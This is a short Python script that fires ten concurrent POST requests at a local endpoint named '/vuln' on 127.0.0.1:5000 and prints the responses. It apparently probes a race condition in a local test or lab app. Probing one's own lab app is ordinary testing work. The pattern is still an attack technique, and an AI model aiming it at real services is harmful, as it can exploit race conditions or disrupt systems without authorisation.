import requests
from concurrent.futures import ThreadPoolExecutor

with ThreadPoolExecutor(max_workers=10) as p:
    for r in p.map(lambda _: requests.post("http://127.0.0.1:5000/vuln"), range(10)):
        print(r.status_code, r.text)
